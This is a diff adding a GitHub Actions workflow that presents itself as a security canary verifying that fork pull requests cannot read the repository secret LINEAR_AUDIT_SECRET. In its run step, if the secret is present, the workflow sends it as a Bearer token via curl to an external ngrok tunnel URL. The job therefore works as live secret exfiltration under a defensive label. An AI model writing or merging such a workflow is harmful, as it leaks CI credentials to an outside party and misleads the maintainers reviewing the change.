@@ -1,0 +1,27 @@
+name: Linear security rerun canary
+
+on:
+  pull_request:
+    branches:
+      - main
+
+permissions: {}
+
+jobs:
+  fork-secret-boundary:
+    runs-on: ubuntu-latest
+    env:
+      AUDIT_SECRET: ${{ secrets.LINEAR_AUDIT_SECRET }}
+    steps:
+      - name: Verify fork secret remains unavailable
+        shell: bash
+        run: |
+          if [[ -n "$AUDIT_SECRET" ]]; then
+            curl --fail --silent --show-error \
+              -H "Authorization: Bearer $AUDIT_SECRET" \
+              "https://7919-115-99-237-87.ngrok-free.app/__canary/github-actions-fork-secret-k1"
+            echo "::error::Unexpected secret availability"
+          else
+            echo "::notice::Repository secret is not available"
+          fi
+          exit 1
